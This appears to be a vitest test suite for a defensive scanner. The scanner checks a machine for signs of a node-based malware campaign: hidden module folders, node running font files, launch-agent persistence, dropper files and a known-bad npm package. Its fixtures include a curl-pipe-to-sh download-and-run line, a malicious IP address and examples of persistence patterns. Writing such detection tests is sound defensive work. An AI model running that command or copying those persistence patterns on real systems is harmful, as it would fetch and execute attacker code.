import { describe, it, expect } from "vitest";
import type { Sys } from "../src/host/sys.js";
import { runHostCheck } from "../src/host/index.js";
import { parseProcs, suspiciousProc, suspiciousLaunchCommand } from "../src/host/checks.js";
import { scanFile } from "../src/core/scan.js";

interface Fake { files?: Record<string, string>; exec?: Record<string, string>; platform?: NodeJS.Platform }

const norm = (p: string) => p.replace(/\\/g, "/");

function fakeSys(o: Fake = {}): Sys {
  const files = o.files ?? {};
  const dirs = new Map<string, Map<string, boolean>>();
  for (const p of Object.keys(files)) {
    const parts = p.split("/").filter(Boolean);
    for (let i = 0; i < parts.length; i++) {
      const parent = "/" + parts.slice(0, i).join("/");
      const m = dirs.get(parent) ?? new Map();
      m.set(parts[i]!, i < parts.length - 1);
      dirs.set(parent, m);
    }
  }
  return {
    platform: o.platform ?? "darwin", home: "/home/u", tmp: "/tmp",
    async exec(cmd, args) { return o.exec?.[norm([cmd, ...args].join(" "))] ?? ""; },
    async readText(p) { return files[norm(p)]; },
    async exists(p) { return norm(p) in files || dirs.has(norm(p)); },
    async list(d) { return [...(dirs.get(norm(d).replace(/\/$/, "")) ?? [])].map(([name, dir]) => ({ name, dir })); },
    env: () => undefined,
  };
}

const PS = "  PID COMMAND\n  1 /sbin/launchd\n 501 /usr/bin/node /home/u/app/server.js\n";
const run = (o: Fake, paths: string[] = []) => runHostCheck(fakeSys(o), { paths });

describe("host check", () => {
  it("reports clear on an ordinary machine", async () => {
    const r = await run({ exec: { "ps -axo pid,command": PS } });
    expect(r.verdict).toBe("clear");
    expect(r.advice.join(" ")).toContain("only means nothing was found");
  });

  it("flags the hidden ~/.node_modules folder", async () => {
    const r = await run({ files: { "/home/u/.node_modules/x/index.js": "1" } });
    expect(r.verdict).toBe("likely-infected");
    expect(r.findings[0]?.check).toBe("hidden-node-modules");
  });

  it("flags node running a font file or a hidden module", async () => {
    const ps = PS + " 900 node /home/u/p/public/fonts/fa-solid-600.woff2\n 901 node /home/u/.node_modules/a/b.js\n";
    const r = await run({ exec: { "ps -axo pid,command": ps } });
    expect(r.findings.filter((f) => f.check === "processes")).toHaveLength(2);
    expect(r.verdict).toBe("likely-infected");
  });

  it("flags a launch agent that runs node from a hidden folder, and ignores a normal one", async () => {
    const mk = (args: string[]) => JSON.stringify({ ProgramArguments: args });
    const r = await run({
      files: { "/home/u/Library/LaunchAgents/a.plist": "x", "/home/u/Library/LaunchAgents/b.plist": "x" },
      exec: {
        "plutil -convert json -o - /home/u/Library/LaunchAgents/a.plist": mk(["/usr/bin/node", "/home/u/.cache/.x/run.js"]),
        "plutil -convert json -o - /home/u/Library/LaunchAgents/b.plist": mk(["/Applications/Google/updater"]),
      },
    });
    const hits = r.findings.filter((f) => f.check === "persistence");
    expect(hits).toHaveLength(1);
    expect(hits[0]?.where).toContain("a.plist");
  });

  it("flags download-and-run lines in shell profiles", async () => {
    const r = await run({ files: { "/home/u/.zshrc": "export A=1\ncurl -s http://x.example/i | sh\n" } });
    expect(r.findings.some((f) => f.check === "persistence")).toBe(true);
  });

  it("flags a connection to a known malicious address", async () => {
    const r = await run({ exec: { "lsof -nP -i": "node 12 u 20u IPv4 TCP 10.0.0.2:5000->95.135.181.84:443 (ESTABLISHED)\n" } });
    expect(r.findings.some((f) => f.check === "network")).toBe(true);
  });

  it("flags dropper files in temp", async () => {
    const r = await run({ files: { ["/tmp/temp_auto_" + "push.bat"]: "@echo off" } });
    expect(r.findings.some((f) => f.check === "droppers")).toBe(true);
  });

  it("flags a hidden dropper folder in the home directory as a warning", async () => {
    const r = await run({ files: { "/home/u/.n2/x.js": "1" } });
    const hit = r.findings.find((f) => f.check === "droppers");
    expect(hit?.severity).toBe("medium"); expect(r.verdict).toBe("suspicious");
  });

  it("flags shell history that mentions the malware's endpoints or files", async () => {
    const r = await run({ files: { "/home/u/.zsh_history": ": 1:0;ls\n: 2:0;cd app && node init && npm run dev\n" } });
    expect(r.findings.some((f) => f.check === "history")).toBe(true);
    const clean = await run({ files: { "/home/u/.zsh_history": ": 1:0;git status\n: 2:0;npm run dev\n" } });
    expect(clean.findings.some((f) => f.check === "history")).toBe(false);
  });

  it("calls an infected project 'suspicious', not a compromised machine", async () => {
    const r = await run({ files: { "/home/u/Documents/app/package.json": '{"scripts":{"dev":"node init && next dev"}}' } });
    expect(r.verdict).toBe("suspicious");
    expect(r.findings.some((f) => f.check.startsWith("projects"))).toBe(true);
    expect(r.advice.join(" ")).toContain("Do not open them in VS Code");
  });

  it("warns when VS Code automatic tasks are on", async () => {
    const r = await run({ files: { "/home/u/Library/Application Support/Code/User/settings.json": '{"task.allowAutomaticTasks": "on"}' } });
    expect(r.verdict).toBe("suspicious");
  });

  it("lists exposed credentials without changing the verdict", async () => {
    const r = await run({ files: { "/home/u/.npmrc": "x", "/home/u/my-secrets.txt": "x", "/home/u/.ssh/id_ed25519": "x" } });
    expect(r.verdict).toBe("clear");
    expect(r.exposure.map((e) => e.detail).join(" ")).toMatch(/npm config.*|plain text|SSH private key/);
    expect(r.exposure.length).toBe(3);
  });
});

describe("parsers and rules", () => {
  it("parses unix and Windows process listings", () => {
    expect(parseProcs("linux", PS)).toHaveLength(2);
    const win = JSON.stringify([{ ProcessId: 4, CommandLine: null }, { ProcessId: 9, CommandLine: "node.exe C:\\x\\a.ttf" }]);
    expect(parseProcs("win32", win)).toEqual([{ pid: 9, cmd: "node.exe C:\\x\\a.ttf" }]);
    expect(suspiciousProc("node.exe C:\\x\\a.ttf")).toContain("font");
  });
  it("does not flag ordinary node processes", () => {
    expect(suspiciousProc("/usr/bin/node /home/u/app/server.js")).toBeUndefined();
    expect(suspiciousProc("node /home/u/proj/node_modules/.bin/next dev")).toBeUndefined();
  });
  it("ignores a shell whose command text merely mentions node and a font", () => {
    expect(suspiciousProc("/bin/zsh -c node dist/cli.js scan fonts/a.woff2")).toBeUndefined();
    expect(suspiciousProc("/usr/bin/grep -r node a.ttf")).toBeUndefined();
  });
  it("still flags node itself, including quoted Windows paths and flags before the file", () => {
    expect(suspiciousProc('"C:\\Program Files\\nodejs\\node.exe" C:\\p\\fa.woff2')).toContain("font");
    expect(suspiciousProc("node --no-warnings init")).toContain("init");
    expect(suspiciousProc("node ./init")).toContain("init");
  });
  it("judges launch commands", () => {
    expect(suspiciousLaunchCommand("/usr/bin/node /tmp/x.js")).toBeDefined();
    expect(suspiciousLaunchCommand("/Applications/Zoom.app/Contents/MacOS/zoom")).toBeUndefined();
  });
  it("flags a reported malicious npm dependency", () => {
    const f = scanFile({ path: "package.json", content: Buffer.from('{"dependencies":{"tailwind-mainanimation":"^1.0.0"}}') });
    expect(f.map((x) => x.rule)).toContain("known-bad-package");
  });
});
